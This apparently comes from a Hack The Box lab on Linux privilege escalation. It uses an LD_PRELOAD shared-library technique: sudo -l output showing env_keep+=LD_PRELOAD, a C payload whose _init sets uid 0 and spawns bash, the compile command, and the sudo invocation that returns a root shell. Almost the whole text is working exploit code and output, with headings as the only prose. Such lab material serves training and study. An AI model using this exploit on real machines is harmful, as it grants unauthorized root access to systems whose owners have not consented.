# Shared Library

## Sudoers

```sh
htb-student@NIX02:~$ sudo -l
```

```output title="Output" hl_lines="5"
Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: /usr/bin/openssl
```

## Malicious Code

```c title="shell.c" linenums="1" hl_lines="6"
#include <stdlib.h>
#include <unistd.h>

void _init()
{
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

## Compilation

```sh
htb-student@NIX02:~$ gcc -shared -o /tmp/shell.so shell.c -fPIC -nostartfiles
```

## Privileged Shell

```sh
htb-student@NIX02:~$ sudo LD_PRELOAD=/tmp/shell.so /usr/bin/openssl
root@NIX02:~# id
```

```output title="Output"
uid=0(root) gid=0(root) groups=0(root)
```
